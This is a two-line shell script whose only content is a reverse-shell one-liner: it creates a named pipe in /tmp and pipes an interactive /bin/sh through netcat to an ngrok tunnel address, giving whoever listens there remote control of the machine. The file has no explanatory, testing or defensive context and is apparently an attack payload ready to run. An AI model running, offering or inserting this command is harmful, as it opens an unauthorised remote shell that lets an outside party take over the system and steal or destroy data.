#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 17416 >/tmp/f
